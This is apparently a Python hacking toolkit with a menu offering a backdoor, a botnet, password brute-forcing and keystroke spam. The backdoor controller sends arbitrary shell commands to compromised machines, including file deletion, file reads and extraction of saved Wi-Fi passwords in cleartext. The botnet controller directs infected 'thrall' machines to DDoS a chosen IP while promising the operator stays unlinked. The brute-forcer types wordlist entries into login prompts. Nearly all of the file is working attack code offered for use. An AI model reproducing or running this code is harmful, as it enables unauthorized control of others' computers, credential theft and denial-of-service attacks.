
######imports###########################
import time, keyboard                  #
import os                              #
import socket                          #
import threading
from threading import Thread           #
import re, uuid, platform              #
import subprocess                      #
from subprocess import check_output    #
import sys                             #
from queue import Queue                #
import urllib.request as urllib2       #
import json                            #
import codecs                          #
import struct   
import multiprocessing                 #
from multiprocessing import Process    #
########################################

global s
global conn

def spam():
	if OS == ("Windows"):
		os.system("cls")
	else:
		os.system("clear")

	scar_word = input("What text do you want to spam: ")
	input_speed = input("\nInput rate: ")
	input_amount = input("\nHow many times do you want to input text: ")
	print("\nNow click on the password entry box and just press enter to start...")
	while True:
		record_scar = keyboard.record(until='return')
		break

	num_try = 0
	for x in range(int(input_amount)):
		time.sleep(int(float(input_speed)))
		keyboard.write(scar_word)
		time.sleep(0.1)
		keyboard.press_and_release("return")
		print("|Entry>|" + str(num_try) + "|" + "TEXT>|" + scar_word + "|")

		num_try += 1

	input("\nFinished spam...\nPress enter...")
	main()





def brute():
	if OS == ("Windows"):
		os.system("cls")
	else:
		os.system("clear")

	try:
		Word_List = input("\nEnter Word List file: ")
		with open ((Word_List), "r") as myfile:
			data = myfile.read()
			data_split = data.split()
	except:
		input(Word_List + " does not exist in current directory...\nPress enter...")
		main()

	input_speed = input("\nInput rate: ")
	print("\nNow click on the password entry box and just press enter to start...")

	while True:
		record_scar = keyboard.record(until='return')
		break

	num_try = 0
	
	for x in range(len(data_split)):
		scar_word = str(data_split[num_try])
		print("|" + str(num_try) + "|TRYING|-|" + data_split[num_try] + "|")
		time.sleep(int(float(input_speed)))
		keyboard.write(scar_word)
		time.sleep(0.1)
		keyboard.press_and_release("return")
		time.sleep(0.05)
		keyboard.press_and_release("ctrl+a, delete")
		try:
			num_try += 1
			del scar_word
		except:
			print("Finished")

	input("Brute Force complete...\nPress enter...")
	main()



def bot_net_listen():
	try:
		host = comip
		port = 9999
		s = socket.socket()
		print("Botnet variables complete...")
	except:
		input("Error making variables...\nPress Enter...")
		try:
			s.close()
			main()
		except:
			main()

	try:
		s.bind((host, port))
		print("Hive binding complete...")

	except:
		input("Hive binding error...\nPress enter...")
		try:
			s.close()
			main()
		except:
			main()

	while True:
		s.listen(99)
		conn, address = s.accept()

		conn.send(str.encode("@#whats your ip#@"))
		time.sleep(1)
		client_response = str(conn.recv(8192), ("utf-8"))
		print(client_response + ("\n"))

		print("===========================================")
		print("=============|Thrall Control|==============")
		print("")
		print("    DDOS: DDOS a website with your HIVE  ")
		print("    quit!: Quits HIVE and goes to main menu")
		while True:
			send_bot = input("Enter a command: ")
			if send_bot == ("quit!"):
				s.close()
				main()

			elif send_bot == ("DDOS"):
				conn.send(str.encode("@#Hive call#@"))
				print("\n=============================================")
				print("|All active thrall(BOTS) will attack...       |")
				print("|The more Thrall you have the better...       |")
				print("|You will not be linked in any way...         |")
				print("|If Thrall is attacking it will be unavalible |")
				print("===============================================")
				send_bot_ddos_ip = input("Enter an ip: ")
				conn.send(str.encode(send_bot_ddos_ip))
				print("Sent Target: " + send_bot_ddos_ip + " to the Thrall...")

				send_bot_ddos_count = input("Enter the attack count: ")
				conn.send(str.encode(send_bot_ddos_count))
				try:
					conn.send(str.encode("data_hive_quit_master"))
					time.sleep(1)
					s.close()
					conn.close()

				except:
					print("Sent Count: " + send_bot_ddos_count + " to the Thrall...")
					input("Thrall should be attacking target!\nPress enter to go to main menu...")
					main()

				finally:
					print("Sent Count: " + send_bot_ddos_count + " to the Thrall..." )
					input("Thrall should be attacking target!\nPress enter to go to main menu...")
					main()



			else:
				print(" ")

def bot_net():
	global s
	
	

	if OS == ("Windows"):
		os.system("cls")
	else:
		os.system("clear")

	bot_net_listen()

def mac_lookup():
	try:
		#Website to extract data
		url = ("http://macvendors.co/api/")

		mac_address = input("\nEnter Mac Address: ")

		request = urllib2.Request(url+mac_address, headers={'User-Agent' : "API Browser"})

		rec_response = urllib2.urlopen( request )

		reader = codecs.getreader("utf-8")
		obj = json.load(reader(rec_response))
		print("")
		print(obj['result']['company'])
		print(obj['result']['address'])
		input("Press Enter...")
		main()
	except:
		input("[!]Error[!]\nPress enter...")
		main()



#create socket############################################
def socket_create():                                     #
	try:                                                   #
		global comip                                         #
		global host                                          # 
		global port                                          #
		global s                                             #
		host = (str(comip))

		port = (9999)
		s = socket.socket()

	except socket.error as msg:
		print ("Socket creation error: " + str(msg))

#bind to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host, port))

	except socket.error as msg:
		print("\nSocket bindding error: " + str(msg) + ("\nRetry..."))
		socket_bind()

#Establish a connection with client (socket/ server must be listening for them)
def socket_accept():
	global usr_ip
	num_try = 0
	while num_try != 1:
		s.listen(20)
		conn, address = s.accept()
		conn.send(str.encode("@#whats your ip#@"))
		client_response = str(conn.recv(8192), ("utf-8"))
		conn.send(str.encode("quit"))
		print(client_response + ("\n"))
		num_try += 1

	usr_ip = input("|Select|IP|Infinity|-> ")
	num_try = 0
	while True:
		if num_try == (10):
			print("Too many Failed attempts...")
			input("Press enter... ")
			main()
		else:
			print("\nTrying...")
			s.listen(20)
			print("\nListening...\n")
			conn, address = s.accept()
			print("Accepting...")
			conn.send(str.encode("@#whats your ip#@"))
			print("\nSent Comfirmaition...\n")
			client_response = str(conn.recv(8192), ("utf-8"))
			print("Got response...")
			print(client_response, end=(""))

			if usr_ip in client_response:
				print("\nCorrect IP...\n")

				break
			else:
				print("\nWrong IP\n")

				conn.send(str.encode("quit"))

				num_try += 1

	print("\nConnection has been esablished | " + "IP " + address[0] + " | Port " + str(address[1]) + ("\nEnter [list!] for Infinity commands"))
	print (("\n") + str(conn) + ("\n"))
	print(address)
	send_commands(conn)#goes to def send_commands()
	conn.close()

#send target commands
def send_commands(conn):
	while True:
		try:
			cmd = input("|Infinity|-> ")
			if cmd == ("quit"):
				conn.send(str.encode(cmd))#sends client data
				time.sleep(5)#waits five seconds
				conn.close()#Closes connection
				s.close()#closes socket connection
				main()#goes to main()

			elif (cmd) == ("list!"):
				print("___________________________________ ")
				print("              |List|                ")
				print("___________________________________ ")
				print("")
				print("\n m!: Make text file...                 ")
				print("\n d!: Delete file...                  ")
				print("\n r!: Read a file...                  ")
				print("\n WP!: Show info of wifi...           ")
				print("\n SW!: Show past wifi connections...  ")
				print("\n TK!: Make client talk(use dashes instead of spaces)...\n")
				print(" CW!: Find current wifi ssid...\n")
				print("NET!: Find devices on network...\n")
				send_commands(conn)




			elif cmd == ("NET!"):
				conn.send(str.encode("arp -a"))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))



			elif (cmd) == ("TK!"):
				tk_input = input("Enter Text:")
				conn.send(str.encode("python txt_speech.py ") + (str.encode(tk_input)))


			elif (cmd) == ("m!"):
				make_txt_name = input("\nName of file: ")
				make_txt_content = input("\nContent: ")
				conn.send(str.encode(('echo ') + ("'") + (make_txt_content) + ("' >") + (make_txt_name) ))


			elif (cmd) == ("d!"):
				del_file_name = input("\nName of file: ")
				conn.send(str.encode(("del ") + (del_file_name)))

			elif (cmd) == ("r!"):
				read_file_name = input("Name of txt file: ")
				conn.send(str.encode(("more ") + (read_file_name)))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))

			elif (cmd) == ("SW!"):
				conn.send(str.encode("netsh wlan show profile"))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))

			elif (cmd) == ("WP!"):
				wifi_name_choice = input("Name of wifi: ")
				conn.send(str.encode(("netsh wlan show profile ") + (wifi_name_choice) + (" key=clear")))
				client_response = str(conn.recv(8192), ("utf-8"))
				print(client_response, end=(""))




			else: 
					if len(str.encode(cmd)) > (0): #if data = none of the above run code below
						conn.send(str.encode(cmd))
						client_response = str(conn.recv(8192), ("utf-8"))
						print(client_response, end=(""))

		except OSError:
			input("\nClient left session...\nPress enter...")
			main()


def main():
	global comip, OS
	#computer local ip
	comip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	comip.connect(("8.8.8.8", 80))
	comip_data = (comip.getsockname()[0])
	comip.close()
	#computer name
	comhostname = (socket.gethostname())
	#computer mac
	commac = (':'.join(re.findall('..', '%012x' % uuid.getnode())))
	#computer OS
	OS = (platform.system())
	
	if OS == ("Windows"):
		os.system("cls")
	else:
		os.system("clear")

	print("		          .                                                      .")
	print("	        .n                   .                 .                  n.")
	print("	  .   .dP                  dP                   9b                 9b.    .")
	print("	 4    qXb         .       dX                     Xb       .        dXp     t")
	print("	dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb")
	print("	9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP")
	print("	 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP")
	print("	  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'")
	print("	    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'")
	print("	        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~")
	print("	                        )b.  .dbo.dP'`v'`9b.odb.  .dX(")
	print("	                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.")
	print("	                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb")
	print("	 1.BACKDOOR         dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb")
	print("	 2.MAC INFO         9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP")
	print("	 3.HIVE(BOTNET)     `'       9XXXXXX(   )XXXXXXP      `'")
	print("	 4.BRUTE FORCE                XXXX X.`v'.X XXXX")
	print("	 5.SPAM                       XP^X'`b   d'`X^XX")
	print("	                              X. 9  `   '  P )X")
	print("	                              `b  `       '  d'")
	print("	                               `             '")
	print("                            ")
	print("                           ")
	print("  IP: " + str(comip_data))
	print("  Hostname: " + comhostname)
	print("  Computer Mac: " + commac)
	print("  Computer OS: " + OS)
	print("     \n")


	awn = input("Pick a number (enter [quit] to quit): ")


	if awn == ("1"):
		
		if OS == "Windows":
			os.system("cls")
		else:
			os.system("clear")

		def backdoor_start():
			#try:
			socket_create()
			socket_bind()
			socket_accept()

			#except RecursionError:
			os.system("clear")
			os.system("cls")

			print("[!]FATAL ERROR[!]\n\nTry again later...\n")

		backdoor_start()

	elif awn == ("2"):
		mac_lookup()
		main()

	elif awn == ("3"):
		bot_net()

	elif awn == ("4"):
		brute()

	elif awn == ("5"):
		spam()


		
	elif awn == ("quit"):
		sys.exit()


	else:
		main()


main()